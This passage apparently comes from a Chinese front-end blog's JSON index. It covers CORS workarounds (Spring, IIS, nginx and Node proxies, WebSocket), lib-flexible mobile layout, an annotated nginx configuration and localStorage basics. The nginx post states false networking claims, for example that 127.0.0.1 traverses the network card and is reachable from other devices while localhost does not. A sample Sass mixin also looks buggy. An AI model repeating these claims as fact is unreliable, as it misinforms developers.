CorsConfiguration corsConfiguration = new CorsConfiguration(); // 可以自行筛选 corsConfiguration.addAllowedOrigin(\"*\"); corsConfiguration.addAllowedHeader(\"*\"); corsConfiguration.addAllowedMethod(\"*\"); return corsConfiguration; &#125; @Bean public CorsFilter corsFilter() &#123; UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource(); source.registerCorsConfiguration(\"/**\", buildConfig()); return new CorsFilter(source); &#125;&#125; 5.）NET后台配置 第一步 网站配置。打开控制面板，选择管理工具,选择iis;右键单击自己的网站，选择浏览;打开网站所在目录,用记事本打开web.config文件添加下述配置信息,重启网站。 请注意,以上截图较老,如果配置仍然出问题,可以考虑增加更多的headers允许,比如: 1\"Access-Control-Allow-Headers\":\"X-Requested-With,Content-Type,Accept,Origin\" 第二步:其它更多配置。如果第一步进行了后,仍然有跨域问题，可能是: 1）接口中有限制死一些请求类型(比如写死了POST等)，这时候请去除限制 2）接口中，重复配置了Origin:*，请去除即可 3）IIS服务器中，重复配置了Origin:*，请去除即可 3、nginx反向代理处理跨域（推荐） 原理： 同源策略是浏览器的安全策略，不是HTTP协议的一部分。服务器端调用HTTP接口只是使用HTTP协议，不会执行JS脚本，不需要同源策略，也就不存在跨越问题。 思路：通过nginx配置一个代理服务器（域名与domain1相同，端口不同）做跳板机，反向代理访问domain2接口，并且可以顺便修改cookie中domain信息，方便当前域cookie写入，实现跨域登录。 具体实现请看 《nginx专讲》 一文。 4、Node.js中间件代理跨域 node中间件实现跨域代理，原理大致与nginx相同，都是通过启一个代理服务器，实现数据的转发。 非vue框架的跨域（2次跨域）：利用node + express + http-proxy-middleware搭建一个proxy服务器。 1.）前端代码示例： 12345678var xhr = new XMLHttpRequest();// 前端开关：浏览器是否读写cookiexhr.withCredentials = true;// 访问http-proxy-middleware代理服务器xhr.open('get', 'http://www.domain1.com:3000/login?user=admin', true);xhr.send(); 2.）中间件服务器： 123456789101112131415161718192021var express = require('express');var proxy = require('http-proxy-middleware');var app = express();app.use('/', proxy(&#123; // 代理跨域目标接口 target: 'http://www.domain2.com:8080', changeOrigin: true, // 修改响应头信息，实现跨域并允许带cookie onProxyRes: function(proxyRes, req, res) &#123; res.header('Access-Control-Allow-Origin', 'http://www.domain1.com'); res.header('Access-Control-Allow-Credentials', 'true'); &#125;, // 修改响应信息中的cookie域名 cookieDomainRewrite: 'www.domain1.com' // 可以为false，表示不修改&#125;));app.listen(3000);console.log('Proxy server is listen at port 3000...'); 3.）Nodejs后台: 123456789101112131415161718var http = require('http');var server = http.createServer();var qs = require('querystring');server.on('request', function(req, res) &#123; var params = qs.parse(req.url.substring(2)); // 向前台写cookie res.writeHead(200, &#123; 'Set-Cookie': 'l=a123456;Path=/;Domain=www.domain2.com;HttpOnly' // HttpOnly:脚本无法读取 &#125;); res.write(JSON.stringify(params)); res.end();&#125;);server.listen('8080');console.log('Server is running at port 8080...'); vue框架的跨域（1次跨域）:利用node + webpack + webpack-dev-server代理接口跨域。 1）在开发环境下，由于vue渲染服务和接口代理服务都是webpack-dev-server同一个，所以页面与代理接口之间不再跨域，无须设置headers跨域信息了。在webpack.config.js部分配置如下即可： 123456789101112131415module.exports = &#123; entry: &#123;&#125;, module: &#123;&#125;, ... devServer: &#123; historyApiFallback: true, proxy: [&#123; context: '/login', target: 'http://www.domain2.com:8080', // 代理跨域目标接口 changeOrigin: true, cookieDomainRewrite: 'www.domain1.com' // 可以为false，表示不修改 &#125;], noInfo: true &#125;&#125; 5、WebSocket协议跨域 WebSocket protocol是HTML5一种新的协议。它实现了浏览器与服务器全双工通信，同时允许跨域通讯，是server push技术的一种很好的实现。原生WebSocket API使用起来不太方便，我们使用Socket.io，它很好地封装了webSocket接口，提供了更简单、灵活的接口，也对不支持webSocket的浏览器提供了向下兼容。 1.）前端代码： 12345678910111213141516171819202122&lt;div&gt;user input：&lt;input type=\"text\"&gt;&lt;/div&gt;&lt;script src=\"./socket.io.js\"&gt;&lt;/script&gt;&lt;script&gt;var socket = io('http://www.domain2.com:8080');// 连接成功处理socket.on('connect', function() &#123; // 监听服务端消息 socket.on('message', function(msg) &#123; console.log('data from server: ---&gt; ' + msg); &#125;); // 监听服务端关闭 socket.on('disconnect', function() &#123; console.log('Server socket has closed.'); &#125;);&#125;);document.getElementsByTagName('input')[0].onblur = function() &#123; socket.send(this.value);&#125;;&lt;/script&gt; 2.）Nodejs socket后台： 123456789101112131415161718192021222324252627var http = require('http');var socket = require('socket.io');// 启http服务var server = http.createServer(function(req, res) &#123; res.writeHead(200, &#123; 'Content-type': 'text/html' &#125;); res.end();&#125;);server.listen('8080');console.log('Server is running at port 8080...');// 监听socket连接socket.listen(server).on('connection', function(client) &#123; // 接收信息 client.on('message', function(msg) &#123; client.send('hello：' + msg); console.log('data from client: ---&gt; ' + msg); &#125;); // 断开处理 client.on('disconnect', function() &#123; console.log('Client socket has closed.'); &#125;);&#125;); 六、分析ajax跨域 上述已经介绍了跨域的原理以及如何解决，但实际过程中，发现仍然有很多人对照着类似的文档无法解决跨域问题，主要体现在不知道什么时候是跨域问题造成的，什么时候不是，因此这里稍微介绍下如何分析一个请求是否跨域： 抓包请求数据： 第一步当然是得知道我们的ajax请求发送了什么数据，接收了什么，做到这一步并不难，也不需要fiddler等工具，仅基于Chrome即可 1）Chrome浏览器打开对应发生ajax的页面，F12打开Dev Tools 2）发送ajax请求 3）右侧面板-&gt;NetWork-&gt;XHR，然后找到刚才的ajax请求，点进去 示例一(正常的ajax请求) 上述请求是一个正确的请求，成功的拿到了响应数据,可以清晰的看到，接口返回的响应头域中，包括了 123Access-Control-Allow-Headers: X-Requested-With,Content-Type,AcceptAccess-Control-Allow-Methods: Get,Post,Put,OPTIONSAccess-Control-Allow-Origin: * 示例二(跨域错误的ajax请求) 这个请求中，接口Allow里面没有包括OPTIONS，所以请求出现了跨域。 这个请求中，Access-Control-Allow-Origin: *出现了两次，导致了跨域配置没有正确配置，出现了错误。 更多跨域错误基本都是类似的，就是以上三样没有满足(Headers,Allow,Origin)，这里不再一一说明。 示例三(与跨域无关的ajax请求) 比如这个请求，它的跨域配置没有一点问题，它出错仅仅是因为request的Accept和response的Content-Type不匹配而已。 标注： 参考资料1：https://segmentfault.com/a/1190000012469713 参考资料2：https://www.cnblogs.com/roam/p/7520433.html","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-服务器","slug":"前端-服务器","permalink":"http://liuxuewen-site.github.io/tags/前端-服务器/"}]},{"title":"flexible实现移动端适配","slug":"mobile-bs-flexible","date":"2018-01-31T06:55:08.000Z","updated":"2019-01-25T09:55:50.233Z","comments":true,"path":"2018/01/31/mobile-bs-flexible/","link":"","permalink":"http://liuxuewen-site.github.io/2018/01/31/mobile-bs-flexible/","excerpt":"","text":"一、引言 关于淘宝，手机淘宝的H5页面是如何实现多终端的适配的呢？比如实现类似下面的页面： 虽然移动的H5页面与PC的Web页面相比简单了不少，但头痛的事是要想尽办法让页面能适配众多不同的终端设备。看看下图你就会知道，这是多么痛苦的一件事情： 再看手淘H5要适配的终端设备数据： 看到这么多数据，要崩溃…… 二、手淘团队适配协作模式 为了应对这多么的终端设备，设计师和前端之间开发的适配协作基本思路是： 1、选择一种尺寸作为设计和开发基准 2、定义一套适配规则，自动适配剩下的两种尺寸(其实不仅这两种，你懂的) 3、特殊适配效果给出设计效果 手淘设计师常选择iPhone6(设备宽高度375pt x 667pt ; 物理像素750pt x 1334pt ; dpr2)作为基准设计尺寸，交付给前端的设计尺寸是按750px * 1334px为准(高度会随着内容多少而改变)。前端开发人员通过一套适配规则自动适配到其他的尺寸。 三、前端开发完成终端适配方案 - - 相关概念 拿到设计师给的设计图之后，剩下的事情是前端开发人员的事了。手淘使用 flexible 方案。在此之前，先了解一些概念。 1、视窗 viewport 简单的理解，viewport是严格等于浏览器的窗口。 在桌面浏览器中，viewport就是浏览器窗口的宽度高度。但在移动端设备上就有点复杂。 做更深的了解，可以阅读 PPK写的相关教程 。 2、物理像素(physical pixel) 物理像素又被称为设备像素，他是显示设备中一个最微小的物理部件。每个像素可以根据操作系统设置自己的颜色和亮度。正是这些设备像素的微小距离欺骗了我们肉眼看到的图像效果。 3、设备独立像素(density-independent pixel) 设备独立像素也称为密度无关像素，可以认为是计算机坐标系统中的一个点，这个点代表一个可以由程序使用的虚拟像素(比如说CSS像素)，然后由相关系统转换为物理像素。其与屏幕密度有关。可用来辅助区分视网膜设备还是非视网膜设备。 4、设备像素比(device pixel ratio) 设备像素比简称为dpr，其定义了物理像素和设备独立像素的对应关系。设备像素比 ＝ 物理像素 / 设备独立像素。 在JavaScript中，可以通过window.devicePixelRatio获取到当前设备的dpr。 而在CSS中，可以通过-webkit-device-pixel-ratio，-webkit-min-device-pixel-ratio和 -webkit-max-device-pixel-ratio进行媒体查询，对不同dpr的设备，做一些样式适配(这里只针对webkit内核的浏览器和webview)。 5、CSS像素 CSS像素是一个抽像的单位，主要使用在浏览器上，用来精确度量Web页面上的内容。一般情况之下，CSS像素称为与设备无关的像素(device-independent pixel)，简称DIPs。 6、屏幕密度 屏幕密度是指一个设备表面上存在的像素数量，它通常以每英寸有多少像素来计算(PPI)。 众所周知，iPhone6的设备宽度和高度为375pt 667pt,可以理解为设备的独立像素；而其dpr为2，根据上面公式，我们可以很轻松得知其物理像素为750pt 1334pt。 7、meta标签 标签有很多种，而这里要着重说的是viewport的meta标签，其主要用来告诉浏览器如何规范的渲染Web页面，而你则需要告诉它视窗有多大。在开发移动端页面，我们需要设置meta标签如下： 1&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1\"&gt; 代码以显示网页的屏幕宽度定义了视窗宽度。网页的比例和最大比例被设置为100%。 8、CSS单位rem 简单的理解，rem就是相对于根元素的font-size来做计算。使用rem单位，是能轻易的根据的font-size计算出元素的盒模型大小。 9、图片适配 在移动端时代屏幕适配除了Layout之外，还要考虑到图片的适配，因为其直接影响到页面显示质量，对于如何实现图片适配，再此不做过多详细阐述。这里盗用了 @南宮瑞揚 根据 mir.aculo.us 翻译的一张信息图： 四、前端开发完成终端适配方案 - - 实现方案 手淘团队有一个名叫 lib-flexible 的库，用来解决H5页面终端适配的。 1、lib-flexible是什么 lib-flexible是一个制作H5适配的开源库，可以点击 这里 下载相关文件，获取需要的JavaScript和CSS文件。 或直接使用阿里CDN(将代码中的换成对应的版本号0.3.4) 1&lt;script src=\"http://g.tbcdn.cn/mtb/lib-flexible/&#123;&#123;version&#125;&#125;/??flexible_css.js,flexible.js\"&gt;&lt;/script&gt; 2、使用方法 第一种方法是将文件下载到你的项目中，然后通过相对路径添加: 12&lt;script src=\"build/flexible_css.debug.js\"&gt;&lt;/script&gt; &lt;script src=\"build/flexible.debug.js\"&gt;&lt;/script&gt; 或者直接加载阿里CDN的文件： 1&lt;script src=\"http://g.tbcdn.cn/mtb/lib-flexible/0.3.4/??flexible_css.js,flexible.js\"&gt;&lt;/script&gt; 另外强烈建议对JS做内联处理，在所有资源加载之前执行这个JS。执行这个JS后，会在元素上增加一个data-dpr属性，以及一个font-size样式。JS会根据不同的设备添加不同的data-dpr值，比如说2或者3，同时会给html加上对应的font-size的值，比如说75px。 如此一来，页面中的元素，都可以通过rem单位来设置。他们会根据html元素的font-size值做相应的计算，从而实现屏幕的适配效果。 除此之外，在引入lib-flexible需要执行的JS之前，可以手动设置meta来控制dpr值，如： 1&lt;meta name=\"flexible\" content=\"initial-dpr=2\" /&gt; 其中initial-dpr会把dpr强制设置为给定的值。如果手动设置了dpr之后，不管设备是多少的dpr，都会强制认为其dpr是你设置的值。在此不建议手动强制设置dpr，因为在Flexible中，只对iOS设备进行dpr的判断，对于Android系列，始终认为其dpr为1。 3、flexible的实质 事实上他做了这几样事情： 1、动态改写标签 2、给元素添加data-dpr属性，并且动态改写data-dpr的值 3、给元素添加font-size属性，并且动态改写font-size的值 五、案例实战回归 回到文章开头，制作一个适配各终端的H5页面步骤如何呢？ 1、创建HTML模板 大家可以根据自己风格写模板。 2、把视觉稿中的px转换成rem 目前日常工作当中，视觉设计师给到前端开发人员手中的视觉稿尺寸一般是基于640px、750px以及1125px宽度为准。 如文章开头显示的示例设计稿，就是一张以750px为基础设计的。那么，我们如何将设计稿中各元素的px转换成rem。 目前Flexible会将视觉稿分成100份（主要为了以后能更好的兼容vh和vw），而每一份被称为一个单位a。同时1rem单位被认定为10a。针对我们这份视觉稿可以计算出： 1a = 7.5px ；1rem = 75px 那么我们这个示例的稿子就分成了100a，也就是整个宽度为10rem，对应的font-size为75px。 这样一来，对于视觉稿上的元素尺寸换算，只需要原始的px值除以rem基准值即可。例如此例视觉稿中的图片，其尺寸是176px 176px,转换成为2.346667rem 2.346667rem。 3、如何快速计算rem 应用各种小工具。 CSSREM: CSSREM是一个CSS的px值转rem值的Sublime Text3自动完成插件。 有关于CSSREM如何安装、配置教程可以点击 这里 查阅。 CSS处理器: 除了使用编辑器的插件之外，还可以使用CSS的处理器处理。比如说Sass、LESS以及PostCSS这样的处理器。我们简单来看两个示例。 Sass :使用Sass的同学，可以使用Sass的函数、混合宏这些功能来实现： 123456789@function px2em($px, $base-font-size: 16px) &#123; @if (unitless($px)) &#123; @warn \"Assuming #&#123;$px&#125; to be in pixels, attempting to convert it into pixels for you\"; @return px2em($px + 0px); // That may fail. &#125; @else if (unit($px) == em) &#123; @return $px; &#125; @return ($px / $base-font-size) * 1em; &#125; 123456789101112131415161718192021222324@mixin px2rem($property,$px-values,$baseline-px:16px,$support-for-ie:false)&#123; //Conver the baseline into rems $baseline-rem: $baseline-px / 1rem * 1; //Print the first line in pixel values @if $support-for-ie &#123; #&#123;$property&#125;: $px-values; &#125; //if there is only one (numeric) value, return the property/value line for it. @if type-of($px-values) == \"number\"&#123; #&#123;$property&#125;: $px-values / $baseline-rem; &#125; @else &#123; //Create an empty list that we can dump values into $rem-values:(); @each $value in $px-values&#123; // If the value is zero or not a number, return it @if $value == 0 or type-of($value) != \"number\"&#123; $rem-values: append($rem-values, $value / $baseline-rem); &#125; &#125; // Return the property and its list of converted values #&#123;$property&#125;: $rem-values; &#125; &#125; PostCSS (px2rem) :可以使用PostCSS其插件postcss-px2rem 或者 px2rem，均是npm工具，具体配置看npm链接。 配置完成之后，在实际使用时，你只要像下面这样使用： 123456.selector &#123; width: 150px; height: 64px; /*px*/ font-size: 28px; /*px*/ border: 1px solid #ddd; /*no*/ &#125; px2rem处理之后将会变成： 12345678910111213141516.selector &#123; width: 2rem; border: 1px solid #ddd; &#125; [data-dpr=\"1\"] .selector &#123; height: 32px; font-size: 14px; &#125; [data-dpr=\"2\"] .selector &#123; height: 64px; font-size: 28px; &#125; [data-dpr=\"3\"] .selector &#123; height: 96px; font-size: 42px; &#125; 4、字号不使用rem 我们在iPhone3G和iPhone4的Retina屏下面，希望看到的文本字号是相同的。也就是说，我们不希望文本在Retina屏幕下变小，另外，我们希望在大屏手机上看到更多文本，以及，现在绝大多数的字体文件都自带一些点阵尺寸，通常是16px和24px，所以我们不希望出现13px和15px这样的奇葩尺寸。 如此一来，就决定了在制作H5的页面中，rem并不适合用到段落文本上。所以在Flexible整个适配方案中，考虑文本还是使用px作为单位。只不过使用[data-dpr]属性来区分不同dpr下的文本字号大小。 1234567891011div &#123; width: 1rem; height: 0.4rem; font-size: 12px; // 默认写上dpr为1的fontSize &#125; [data-dpr=\"2\"] div &#123; font-size: 24px; &#125; [data-dpr=\"3\"] div &#123; font-size: 36px; &#125; 为了能更好的利于开发，在实际开发中，我们可以定制一个font-dpr()这样的Sass混合宏 123456789@mixin font-dpr($font-size)&#123; font-size: $font-size; [data-dpr=\"2\"] &amp; &#123; font-size: $font-size * 2; &#125; [data-dpr=\"3\"] &amp; &#123; font-size: $font-size * 3; &#125; &#125; 有了这样的混合宏之后，在开发中可以直接这样使用： 1@include font-dpr(16px); 当然这只是针对于描述性的文本，比如说段落文本。但有的时候文本的字号也需要分场景的，比如在项目中有一个slogan,业务方希望这个slogan能根据不同的终端适配。针对这样的场景，完全可以使用rem给slogan做计量单位。 标注： 参考资料1：http://www.w3cplus.com/mobile/lib-flexible-for-html5-layout.html","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-移动端适配","slug":"前端-移动端适配","permalink":"http://liuxuewen-site.github.io/tags/前端-移动端适配/"}]},{"title":"nginx专讲","slug":"server-bs-nginx","date":"2018-01-31T02:51:51.000Z","updated":"2019-01-25T09:54:16.678Z","comments":true,"path":"2018/01/31/server-bs-nginx/","link":"","permalink":"http://liuxuewen-site.github.io/2018/01/31/server-bs-nginx/","excerpt":"","text":"一、nginx Nginx是一个高性能的HTTP和反向代理服务器，也是一个IMAP/POP3/SMTP服务器。其特点是占有内存少，并发能力强，性能高。 二、nginx功能 1）反向代理。比如想在本地使用 www.mickey.com 的域名去访问 www.taobao.com。这个时候我们就可以通过nginx去实现。可解决跨域问题。 2）负载均衡。比如我的项目部署在不同的服务器上，但是通过统一的域名进入，由nginx对请求进行分发，减轻了服务器的压力。 上面这两种情况下，nginx服务器的作用都只是作为分发服务器，真正的内容，我们可以放在其他的服务器上，这样来，还能起到一层安全隔壁的作用，nginx作为隔离层。 三、nginx安装 在 http://nginx.org/ 下载对应版本的nginx； 在 nginx 的目录下使用 start nginx 或者 双击 nginx.exe 打开nginx（注意端口冲突）； 四、nginx配置属性说明 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141#全局设置main # 运行用户user www-data; # 启动进程,通常设置成和cpu的数量相等worker_processes 1;# 全局错误日志及PID文件error_log /var/log/nginx/error.log;pid /var/run/nginx.pid;# 工作模式及连接数上限events &#123; use epoll; #epoll是多路复用IO(I/O Multiplexing)中的一种方式,但是仅用于linux2.6以上内核,可以大大提高nginx的性能 worker_connections 1024; #单个后台worker process进程的最大并发链接数 # multi_accept on; &#125;#设定http服务器，利用它的反向代理功能提供负载均衡支持http &#123; #设定mime类型,类型由mime.type文件定义 include /etc/nginx/mime.types; default_type application/octet-stream; #设定日志格式 access_log /var/log/nginx/access.log; #sendfile 指令指定 nginx 是否调用 sendfile 函数（zero copy 方式）来输出文件，对于普通应用， #必须设为 on,如果用来进行下载等应用磁盘IO重负载应用，可设置为 off，以平衡磁盘与网络I/O处理速度，降低系统的uptime. sendfile on; #将tcp_nopush和tcp_nodelay两个指令设置为on用于防止网络阻塞 tcp_nopush on; tcp_nodelay on; #连接超时时间 keepalive_timeout 65; #开启gzip压缩 gzip on; gzip_disable \"MSIE [1-6]\\.(?!.*SV1)\"; #设定请求缓冲 client_header_buffer_size 1k; large_client_header_buffers 4 4k; include /etc/nginx/conf.d/*.conf; include /etc/nginx/sites-enabled/*; #设定负载均衡的服务器列表 upstream mysvr &#123; #weigth参数表示权值，权值越高被分配到的几率越大 #本机上的Squid开启3128端口 server 192.168.8.1:3128 weight=5; server 192.168.8.2:80 weight=1; server 192.168.8.3:80 weight=6; &#125; server &#123; #侦听80端口 listen 80; #定义使用www.xx.com访问 server_name www.xx.com; #设定本虚拟主机的访问日志 access_log logs/www.xx.com.access.log main; #默认请求 location / &#123; root /root; #定义服务器的默认网站根目录位置 index index.php index.html index.htm; #定义首页索引文件的名称 fastcgi_pass www.xx.com; fastcgi_param SCRIPT_FILENAME $document_root/$fastcgi_script_name; include /etc/nginx/fastcgi_params; &#125; # 定义错误提示页面 error_page 500 502 503 504 /50x.html; location = /50x.html &#123; root /root; &#125; #静态文件，nginx自己处理 location ~ ^/(images|javascript|js|css|flash|media|static)/ &#123; root /var/www/virtual/htdocs; #过期30天，静态文件不怎么更新，过期可以设大一点，如果频繁更新，则可以设置得小一点。 expires 30d; &#125; #PHP 脚本请求全部转发到 FastCGI处理. 使用FastCGI默认配置. location ~ \\.php$ &#123; root /root; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /home/www/www$fastcgi_script_name; include fastcgi_params; &#125; #设定查看Nginx状态的地址 location /NginxStatus &#123; stub_status on; access_log on; auth_basic \"NginxStatus\"; auth_basic_user_file conf/htpasswd; &#125; #禁止访问 .htxxx 文件 location ~ /\\.ht &#123; deny all; &#125; &#125; #第一个虚拟服务器 server &#123; #侦听192.168.8.x的80端口 listen 80; server_name 192.168.8.x; #对aspx后缀的进行负载均衡请求 location ~ .*\\.aspx$ &#123; root /root;#定义服务器的默认网站根目录位置 index index.php index.html index.htm;#定义首页索引文件的名称 proxy_pass http://mysvr;#请求转向mysvr 定义的服务器列表 #以下是一些反向代理的配置可删除. proxy_redirect off; #后端的Web服务器可以通过X-Forwarded-For获取用户真实IP proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; client_max_body_size 10m; #允许客户端请求的最大单文件字节数 client_body_buffer_size 128k; #缓冲区代理缓冲用户端请求的最大字节数， proxy_connect_timeout 90; #nginx跟后端服务器连接超时时间(代理连接超时) proxy_send_timeout 90; #后端服务器数据回传时间(代理发送超时) proxy_read_timeout 90; #连接成功后，后端服务器响应时间(代理接收超时) proxy_buffer_size 4k; #设置代理服务器（nginx）保存用户头信息的缓冲区大小 proxy_buffers 4 32k; #proxy_buffers缓冲区，网页平均在32k以下的话，这样设置 proxy_busy_buffers_size 64k; #高负荷下缓冲大小（proxy_buffers*2） proxy_temp_file_write_size 64k; #设定缓存文件夹大小，大于这个值，将从upstream服务器传 &#125; &#125;&#125; 五、nginx反向代理1、代理服务器： 客户机在发送请求时，不会直接发送给目的主机，而是先发送给代理服务器，代理服务接受客户机请求之后，再向主机发出，并接收目的主机返回的数据，存放在代理服务器的硬盘中，再发送给客户机。 2、代理服务器作用： 提高访问速度：目标主机返回的数据会存放在代理服务器的硬盘中，因此下一次客户再访问相同的站点数据时，会直接从代理服务器的硬盘中读取，起到了缓存的作用，尤其对于热门站点能明显提高请求速度。 防火墙：由于所有的客户机请求都必须通过代理服务器访问远程站点，因此可在代理服务器上设限，过滤某些不安全信息。 访问不能访问的目标站点：客户机在访问受限时，可通过不受限的代理服务器访问目标站点，通俗说，我们使用的翻墙浏览器就是利用了代理服务器，虽然不能出国，但也可直接访问外网。 3、正向代理与反向代理： 比如要访问youtube,但是不能直接访问，只能先找个翻墙软件，通过翻墙软件才能访问youtube. 翻墙软件就叫做正向代理。 比如要访问youtube,但是youtube悄悄地把这个请求交给x-art来做，那么x-art就是反向代理了。 正向代理中，proxy和client同属一个LAN，对server透明；反向代理中，proxy和server同属一个LAN，对client透明。 4、反向代理实践： 此处不作讲解，用时查。 5、反向代理处理跨域： 关于跨域的相关知识，本文不做讲解，只做应用。 首先，下载好nginx，把本地项目放至nginx目录下的html文件夹里； 第二，打开nginx/conf目录下的nginx.conf文件进行相关设置,如图，解释看三: 第三：上图中，listen表示端口号，默认为80(80可省）；server_name表示服务器名称，此处设为localhost。 &emsp;&emsp;&emsp;本地项目中的的接口，均把远程服务器ip改为localhost，(此时访问出错) &emsp;&emsp;&emsp;如：http://11.11.11.1/html/index.html改为http://localhost/html/index.html &emsp;&emsp;&emsp;前两个location配置本地打开项目（还没涉及接口）， &emsp;&emsp;&emsp;第一个浏览器url若匹配到reconsitutionYD，跳至目录下的页面（第二个同理） &emsp;&emsp;&emsp;如：http://127.0.0.1:80/reconsitutionYD/html/index.html &emsp;&emsp;&emsp;与：http://127.0.0.1:80/guanwang/html/index.html &emsp;&emsp;&emsp;第三个location配置代理到百度（涉及接口）， &emsp;&emsp;&emsp;当匹配到接口中的gw时，nginx将ip替换为www.baidu.com， &emsp;&emsp;&emsp;如：http://127.0.0.1/gw/?t=asdada &emsp;&emsp;&emsp;变：http://www.baidu.com/?t=asdada &emsp;&emsp;&emsp;第四个location，当前面都匹配不到时，配置代理到谷歌（涉及接口）， &emsp;&emsp;&emsp;当前面的匹配都没有时，nginx将ip替换为www.google.com， &emsp;&emsp;&emsp;如：http://127.0.0.1/aaaaa/?t=asdada &emsp;&emsp;&emsp;变：http://www.google.com/?t=asdada 6、localhost与127.0.0.1： 在第5点实践的时候，我们发现， 若接口写http://localhost/……，那么浏览器地址就必须为http://localhost/……， 若接口写http://127.0.0.1/……，那么浏览器地址就必须为http://127.0.0.1/……， 这就引发出了个问题，localhost与127.0.0.1有什么区别？ 一开始我觉得他们是通用的，只是表示本地服务器的两个不同的写法而已，因为经常将它们替换来替换去，就好比一个网页可以通过域名来访问也可以通过IP来访问一样，localhost代表的是域名，而127.0.0.1则代表IP地址。 下面看它们间的区别吧 首先从概念开始： 123456789localhost：本地服务器127.0.0.1：本机地址(本机服务器)localhost 是一个域名，在过去它指向 127.0.0.1 这个IP地址。在操作系统支持 ipv6 后，它同时还指向ipv6 的地址 [::1]。但它可以被配置为任意的 IP 地址。127.0.0.1 是绑定在物理或虚拟网络接口上的IP地址，可供其他设备访问到。 接着，是工作原理： 123456789localhot：是不经网卡传输的，它不受网络防火墙和网卡相关的的限制。127.0.0.1：是通过网卡传输的，它依赖网卡，并受到网络防火墙和网卡相关的限制。许多情况下localhost不能访问但127.0.0.1可以访问的问题，究其原因，可能是：用localhost访问时，系统带的本机当前用户的权限去访问，用ip访问时，等于本机是通过网络再去访问本机，涉及到网络用户的权限。另外，我们现在也应该明白了一个道理，一般设置程序时本地服务最好用localhost，因为localhost不会解析成IP，也不会占用网卡、网络资源。 那么，localhost不能访问127.0.0.1可以访问的情况下的解决方案有哪些呢？ 一般情况下ping localhost 应该为127.0.0.1 ，但是有时会出来下面这个东西： 1234&gt;ping localhost reply from ::1: times&lt;1ms reply from ::1: times&lt;1ms reply from ::1: times&lt;1ms 地址根本不是“127.0.0.1”，而是“::1:” 1234&gt;ping 127.0.0.1 正常reply from 127.0.0.1 : bytes=32 times&lt;1ms reply from 127.0.0.1 : bytes=32 times&lt;1ms reply from 127.0.0.1 : bytes=32 times&lt;1ms 原因是：IPV6协议将127.0.0.1解析为 ::1 (127.0.0.1 ipv6的形式) 解决方案1： 修改host文件：用记事本打开C:/WINDOWS/system32/drivers/etc/hosts文件，看里面是否有包含127.0.0.1 localhost，没有则将其添加进去，再查看能否访问localhost。 1234# 127.0.0.1 localhost# ::1 localhost127.0.0.1localhost localhost 127.0.0.1 解决方案2： 1、打开Internert信息管理查看IIS是否启动，且默认网站时候已经开启； 2、打开http://127.0.0.1/ 看是否能访问IIS的默认网页，能则说明IIS已成功安装到电脑，可能是无法解析localhost； 3、ping localhost，看是否能ping通，并从127.0.0.1上返回信息，如果成功则说明可以解析localhost； 4、如果上一步不成功，则用记事本打开C:/WINDOWS/system32/drivers/etc/hosts文件，看里面是否有包含：127.0.0.1 localhost ，如果没有则将其添加进去，再查看能否访问localhost。 5、尝试将网站的主目录指向另一个目录或新建一个虚拟目录，并在该新目录创建一个新的网页文件，如index.html，然后将其加到默认网站的”文档”项中作为默认访问的网页，重新输入网址：http://localhost/，看否能访问。 6、还是不行的话将IIS卸载掉，重新再安装一次。 解决问题的思路： 1、ping一下localhost，这个是关键，看看是否能ping通，然后看解析到哪个ip地址下了 2、然后查看本机的hosts文件，看看是否有被修改，如果被修改，就改回正常的模式 3、解决问题本质，ipconfig看看网络是否正常，如果不正常就进行修复 4、用杀毒软件或者360等修复软件进行扫描，看看是否存在恶意插件或者病毒，然后清除，一劳永逸！ 5、多动脑，想办法解决问题，善于用搜索引擎。 标注： 本文综合多个网上教程所改，五/6改自http://www.webkaka.com/tutorial/server/2013/121611/","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-服务器","slug":"前端-服务器","permalink":"http://liuxuewen-site.github.io/tags/前端-服务器/"}]},{"title":"localStorage专讲","slug":"JS-bs-localStorage","date":"2018-01-30T09:38:18.000Z","updated":"2018-07-03T17:53:40.016Z","comments":true,"path":"2018/01/30/JS-bs-localStorage/","link":"","permalink":"http://liuxuewen-site.github.io/2018/01/30/JS-bs-localStorage/","excerpt":"","text":"一、localStorage优势： 1）拓展了cookie的4K限制。 2）会将第一次请求的数据直接存储到本地，这相当于一个5M大小的针对于前端页面的数据库，相比于cookie可以节约带宽。 二、localStorage局限： 1）浏览器不统一，并且在IE8以上的IE版本才支持localStorage这个属性。 2）目前所有的浏览器都会把localStorage的值类型限定为string类型，我们日常较常见的JSON对象类型需要一些转换。 3）localStorage在浏览器的隐私模式下面是不可读取的。 4）localStorage本质上是对字符串的读取，如果存储内容多的话会消耗内存空间，会导致页面变卡。 5）localStorage不能被爬虫抓取到。 三、判断浏览器是否支持localStorage这个属性： 123456if(!window.localStorage)&#123; alert(\"浏览器不支持localstorage\"); return false;&#125;else&#123; //主逻辑业务&#125; 四、localStorage写入(三种方法)： 123456789101112if(!window.localStorage)&#123; alert(\"浏览器不支持localstorage\"); return false;&#125;else&#123; var storage=window.localStorage; storage[\"a\"]=1; //写入a字段 storage.b=1; //写入b字段 storage.setItem(\"c\",3); //写入c字段 console.log(typeof storage[\"a\"]); console.log(typeof storage[\"b\"]); console.log(typeof storage[\"c\"]);&#125; 五、localStorage写入(三种方法)： 123456789101112if(!window.localStorage)&#123; alert(\"浏览器不支持localstorage\"); return false;&#125;else&#123; var storage=window.localStorage; storage[\"a\"]=1; //写入a字段 storage.b=1; //写入b字段 storage.setItem(\"c\",3); //写入c字段 console.log(typeof storage[\"a\"]); console.log(typeof storage[\"b\"]); console.log(typeof storage[\"c\"]);&#125; 这里要特别说明一下localStorage的使用也是遵循同源策略的，所以不同的网站直接是不能共用相同的localStorage. 